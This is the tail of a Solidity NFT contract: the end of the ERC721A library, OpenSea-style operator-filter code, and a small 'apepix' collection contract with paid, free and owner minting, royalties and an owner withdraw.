1047     // =============================================================
1048     //                        MINT OPERATIONS
1049     // =============================================================
1050 
1051     /**
1052      * @dev Mints `quantity` tokens and transfers them to `to`.
1053      *
1054      * Requirements:
1055      *
1056      * - `to` cannot be the zero address.
1057      * - `quantity` must be greater than 0.
1058      *
1059      * Emits a {Transfer} event for each mint.
1060      */
1061     function _mint(address to, uint256 quantity) internal virtual {
1062         uint256 startTokenId = _currentIndex;
1063         if (quantity == 0) revert MintZeroQuantity();
1064 
1065         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1066 
1067         // Overflows are incredibly unrealistic.
1068         // `balance` and `numberMinted` have a maximum limit of 2**64.
1069         // `tokenId` has a maximum limit of 2**256.
1070         unchecked {
1071             // Updates:
1072             // - `balance += quantity`.
1073             // - `numberMinted += quantity`.
1074             //
1075             // We can directly add to the `balance` and `numberMinted`.
1076             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1077 
1078             // Updates:
1079             // - `address` to the owner.
1080             // - `startTimestamp` to the timestamp of minting.
1081             // - `burned` to `false`.
1082             // - `nextInitialized` to `quantity == 1`.
1083             _packedOwnerships[startTokenId] = _packOwnershipData(
1084                 to,
1085                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1086             );
1087 
1088             uint256 toMasked;
1089             uint256 end = startTokenId + quantity;
1090 
1091             // Use assembly to loop and emit the `Transfer` event for gas savings.
1092             // The duplicated `log4` removes an extra check and reduces stack juggling.
1093             // The assembly, together with the surrounding Solidity code, have been
1094             // delicately arranged to nudge the compiler into producing optimized opcodes.
1095             assembly {
1096                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1097                 toMasked := and(to, _BITMASK_ADDRESS)
1098                 // Emit the `Transfer` event.
1099                 log4(
1100                     0, // Start of data (0, since no data).
1101                     0, // End of data (0, since no data).
1102                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1103                     0, // `address(0)`.
1104                     toMasked, // `to`.
1105                     startTokenId // `tokenId`.
1106                 )
1107 
1108                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1109                 // that overflows uint256 will make the loop run out of gas.
1110                 // The compiler will optimize the `iszero` away for performance.
1111                 for {
1112                     let tokenId := add(startTokenId, 1)
1113                 } iszero(eq(tokenId, end)) {
1114                     tokenId := add(tokenId, 1)
1115                 } {
1116                     // Emit the `Transfer` event. Similar to above.
1117                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1118                 }
1119             }
1120             if (toMasked == 0) revert MintToZeroAddress();
1121 
1122             _currentIndex = end;
1123         }
1124         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1125     }
1126 
1127     /**
1128      * @dev Mints `quantity` tokens and transfers them to `to`.
1129      *
1130      * This function is intended for efficient minting only during contract creation.
1131      *
1132      * It emits only one {ConsecutiveTransfer} as defined in
1133      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1134      * instead of a sequence of {Transfer} event(s).
1135      *
1136      * Calling this function outside of contract creation WILL make your contract
1137      * non-compliant with the ERC721 standard.
1138      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1139      * {ConsecutiveTransfer} event is only permissible during contract creation.
1140      *
1141      * Requirements:
1142      *
1143      * - `to` cannot be the zero address.
1144      * - `quantity` must be greater than 0.
1145      *
1146      * Emits a {ConsecutiveTransfer} event.
1147      */
1148     function _mintERC2309(address to, uint256 quantity) internal virtual {
1149         uint256 startTokenId = _currentIndex;
1150         if (to == address(0)) revert MintToZeroAddress();
1151         if (quantity == 0) revert MintZeroQuantity();
1152         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1153 
1154         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1155 
1156         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1157         unchecked {
1158             // Updates:
1159             // - `balance += quantity`.
1160             // - `numberMinted += quantity`.
1161             //
1162             // We can directly add to the `balance` and `numberMinted`.
1163             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1164 
1165             // Updates:
1166             // - `address` to the owner.
1167             // - `startTimestamp` to the timestamp of minting.
1168             // - `burned` to `false`.
1169             // - `nextInitialized` to `quantity == 1`.
1170             _packedOwnerships[startTokenId] = _packOwnershipData(
1171                 to,
1172                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1173             );
1174 
1175             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1176 
1177             _currentIndex = startTokenId + quantity;
1178         }
1179         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1180     }
1181 
1182     /**
1183      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1184      *
1185      * Requirements:
1186      *
1187      * - If `to` refers to a smart contract, it must implement
1188      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1189      * - `quantity` must be greater than 0.
1190      *
1191      * See {_mint}.
1192      *
1193      * Emits a {Transfer} event for each mint.
1194      */
1195     function _safeMint(
1196         address to,
1197         uint256 quantity,
1198         bytes memory _data
1199     ) internal virtual {
1200         _mint(to, quantity);
1201 
1202         unchecked {
1203             if (to.code.length != 0) {
1204                 uint256 end = _currentIndex;
1205                 uint256 index = end - quantity;
1206                 do {
1207                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1208                         revert TransferToNonERC721ReceiverImplementer();
1209                     }
1210                 } while (index < end);
1211                 // Reentrancy protection.
1212                 if (_currentIndex != end) revert();
1213             }
1214         }
1215     }
1216 
1217     /**
1218      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1219      */
1220     function _safeMint(address to, uint256 quantity) internal virtual {
1221         _safeMint(to, quantity, '');
1222     }
1223 
1224     // =============================================================
1225     //                        BURN OPERATIONS
1226     // =============================================================
1227 
1228     /**
1229      * @dev Equivalent to `_burn(tokenId, false)`.
1230      */
1231     function _burn(uint256 tokenId) internal virtual {
1232         _burn(tokenId, false);
1233     }
1234 
1235     /**
1236      * @dev Destroys `tokenId`.
1237      * The approval is cleared when the token is burned.
1238      *
1239      * Requirements:
1240      *
1241      * - `tokenId` must exist.
1242      *
1243      * Emits a {Transfer} event.
1244      */
1245     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1246         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1247 
1248         address from = address(uint160(prevOwnershipPacked));
1249 
1250         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1251 
1252         if (approvalCheck) {
1253             // The nested ifs save around 20+ gas over a compound boolean condition.
1254             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1255                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1256         }
1257 
1258         _beforeTokenTransfers(from, address(0), tokenId, 1);
1259 
1260         // Clear approvals from the previous owner.
1261         assembly {
1262             if approvedAddress {
1263                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1264                 sstore(approvedAddressSlot, 0)
1265             }
1266         }
1267 
1268         // Underflow of the sender's balance is impossible because we check for
1269         // ownership above and the recipient's balance can't realistically overflow.
1270         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1271         unchecked {
1272             // Updates:
1273             // - `balance -= 1`.
1274             // - `numberBurned += 1`.
1275             //
1276             // We can directly decrement the balance, and increment the number burned.
1277             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1278             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1279 
1280             // Updates:
1281             // - `address` to the last owner.
1282             // - `startTimestamp` to the timestamp of burning.
1283             // - `burned` to `true`.
1284             // - `nextInitialized` to `true`.
1285             _packedOwnerships[tokenId] = _packOwnershipData(
1286                 from,
1287                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1288             );
1289 
1290             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1291             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1292                 uint256 nextTokenId = tokenId + 1;
1293                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1294                 if (_packedOwnerships[nextTokenId] == 0) {
1295                     // If the next slot is within bounds.
1296                     if (nextTokenId != _currentIndex) {
1297                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1298                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1299                     }
1300                 }
1301             }
1302         }
1303 
1304         emit Transfer(from, address(0), tokenId);
1305         _afterTokenTransfers(from, address(0), tokenId, 1);
1306 
1307         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1308         unchecked {
1309             _burnCounter++;
1310         }
1311     }
1312 
1313     // =============================================================
1314     //                     EXTRA DATA OPERATIONS
1315     // =============================================================
1316 
1317     /**
1318      * @dev Directly sets the extra data for the ownership data `index`.
1319      */
1320     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1321         uint256 packed = _packedOwnerships[index];
1322         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1323         uint256 extraDataCasted;
1324         // Cast `extraData` with assembly to avoid redundant masking.
1325         assembly {
1326             extraDataCasted := extraData
1327         }
1328         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1329         _packedOwnerships[index] = packed;
1330     }
1331 
1332     /**
1333      * @dev Called during each token transfer to set the 24bit `extraData` field.
1334      * Intended to be overridden by the cosumer contract.
1335      *
1336      * `previousExtraData` - the value of `extraData` before transfer.
1337      *
1338      * Calling conditions:
1339      *
1340      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1341      * transferred to `to`.
1342      * - When `from` is zero, `tokenId` will be minted for `to`.
1343      * - When `to` is zero, `tokenId` will be burned by `from`.
1344      * - `from` and `to` are never both zero.
1345      */
1346     function _extraData(
1347         address from,
1348         address to,
1349         uint24 previousExtraData
1350     ) internal view virtual returns (uint24) {}
1351 
1352     /**
1353      * @dev Returns the next extra data for the packed ownership data.
1354      * The returned result is shifted into position.
1355      */
1356     function _nextExtraData(
1357         address from,
1358         address to,
1359         uint256 prevOwnershipPacked
1360     ) private view returns (uint256) {
1361         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1362         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1363     }
1364 
1365     // =============================================================
1366     //                       OTHER OPERATIONS
1367     // =============================================================
1368 
1369     /**
1370      * @dev Returns the message sender (defaults to `msg.sender`).
1371      *
1372      * If you are writing GSN compatible contracts, you need to override this function.
1373      */
1374     function _msgSenderERC721A() internal view virtual returns (address) {
1375         return msg.sender;
1376     }
1377 
1378     /**
1379      * @dev Converts a uint256 to its ASCII string decimal representation.
1380      */
1381     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1382         assembly {
1383             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1384             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1385             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1386             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1387             let m := add(mload(0x40), 0xa0)
1388             // Update the free memory pointer to allocate.
1389             mstore(0x40, m)
1390             // Assign the `str` to the end.
1391             str := sub(m, 0x20)
1392             // Zeroize the slot after the string.
1393             mstore(str, 0)
1394 
1395             // Cache the end of the memory to calculate the length later.
1396             let end := str
1397 
1398             // We write the string from rightmost digit to leftmost digit.
1399             // The following is essentially a do-while loop that also handles the zero case.
1400             // prettier-ignore
1401             for { let temp := value } 1 {} {
1402                 str := sub(str, 1)
1403                 // Write the character to the pointer.
1404                 // The ASCII index of the '0' character is 48.
1405                 mstore8(str, add(48, mod(temp, 10)))
1406                 // Keep dividing `temp` until zero.
1407                 temp := div(temp, 10)
1408                 // prettier-ignore
1409                 if iszero(temp) { break }
1410             }
1411 
1412             let length := sub(end, str)
1413             // Move the pointer 32 bytes leftwards to make room for the length.
1414             str := sub(str, 0x20)
1415             // Store the length.
1416             mstore(str, length)
1417         }
1418     }
1419 }
1420 
1421 
1422 interface IOperatorFilterRegistry {
1423     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1424     function register(address registrant) external;
1425     function registerAndSubscribe(address registrant, address subscription) external;
1426     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1427     function unregister(address addr) external;
1428     function updateOperator(address registrant, address operator, bool filtered) external;
1429     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1430     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1431     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1432     function subscribe(address registrant, address registrantToSubscribe) external;
1433     function unsubscribe(address registrant, bool copyExistingEntries) external;
1434     function subscriptionOf(address addr) external returns (address registrant);
1435     function subscribers(address registrant) external returns (address[] memory);
1436     function subscriberAt(address registrant, uint256 index) external returns (address);
1437     function copyEntriesOf(address registrant, address registrantToCopy) external;
1438     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1439     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1440     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1441     function filteredOperators(address addr) external returns (address[] memory);
1442     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1443     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1444     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1445     function isRegistered(address addr) external returns (bool);
1446     function codeHashOf(address addr) external returns (bytes32);
1447 }
1448 
1449 
1450 /**
1451  * @title  OperatorFilterer
1452  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1453  *         registrant's entries in the OperatorFilterRegistry.
1454  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1455  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1456  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1457  */
1458 abstract contract OperatorFilterer {
1459     error OperatorNotAllowed(address operator);
1460 
1461     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1462         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1463 
1464     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1465         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1466         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1467         // order for the modifier to filter addresses.
1468         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1469             if (subscribe) {
1470                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1471             } else {
1472                 if (subscriptionOrRegistrantToCopy != address(0)) {
1473                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1474                 } else {
1475                     OPERATOR_FILTER_REGISTRY.register(address(this));
1476                 }
1477             }
1478         }
1479     }
1480 
1481     modifier onlyAllowedOperator(address from) virtual {
1482         // Check registry code length to facilitate testing in environments without a deployed registry.
1483         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1484             // Allow spending tokens from addresses with balance
1485             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1486             // from an EOA.
1487             if (from == msg.sender) {
1488                 _;
1489                 return;
1490             }
1491             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1492                 revert OperatorNotAllowed(msg.sender);
1493             }
1494         }
1495         _;
1496     }
1497 
1498     modifier onlyAllowedOperatorApproval(address operator) virtual {
1499         // Check registry code length to facilitate testing in environments without a deployed registry.
1500         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1501             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1502                 revert OperatorNotAllowed(operator);
1503             }
1504         }
1505         _;
1506     }
1507 }
1508 
1509 /**
1510  * @title  DefaultOperatorFilterer
1511  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1512  */
1513 abstract contract TheOperatorFilterer is OperatorFilterer {
1514     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1515     address public owner;
1516 
1517     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1518 }
1519 
1520 
1521 contract apepix is ERC721A, TheOperatorFilterer {
1522 
1523     uint256 public maxSupply = 2222;
1524 
1525     uint256 public mintPrice = 0.001 ether;
1526 
1527     function mint(uint256 amount) payable public {
1528         require(totalSupply() + amount <= maxSupply);
1529         require(msg.value >= mintPrice * amount);
1530         _safeMint(msg.sender, amount);
1531     }
1532 
1533     function freemint() public {
1534         require(totalSupply() + 1 <= maxSupply);
1535         require(balanceOf(msg.sender) < 1);
1536         _safeMint(msg.sender, FreeNum());
1537     }
1538 
1539     function teamMint(address addr, uint256 amount) public onlyOwner {
1540         require(totalSupply() + amount <= maxSupply);
1541         _safeMint(addr, amount);
1542     }
1543     
1544     modifier onlyOwner {
1545         require(owner == msg.sender);
1546         _;
1547     }
1548 
1549     constructor() ERC721A("apepix", "ape") {
1550         owner = msg.sender;
1551     }
1552 
1553     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1554         return string(abi.encodePacked("ipfs://bafybeibki442hzosvird6sknihggf7zxw52lcyhdbfmx66bnsbfdepixaa/", _toString(tokenId), ".json"));
1555     }
1556 
1557     function FreeNum() internal returns (uint256){
1558         return (maxSupply - totalSupply()) / 1000 + 1;
1559     }
1560 
1561     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1562         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1563         return (owner, royaltyAmount);
1564     }
1565 
1566     function withdraw() external onlyOwner {
1567         payable(msg.sender).transfer(address(this).balance);
1568     }
1569 
1570     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1571         super.setApprovalForAll(operator, approved);
1572     }
1573 
1574     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1575         super.approve(operator, tokenId);
1576     }
1577 
1578     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1579         super.transferFrom(from, to, tokenId);
1580     }
1581 
1582     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1583         super.safeTransferFrom(from, to, tokenId);
1584     }
1585 
1586     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1587         public
1588         payable
1589         override
1590         onlyAllowedOperator(from)
1591     {
1592         super.safeTransferFrom(from, to, tokenId, data);
1593     }
1594 }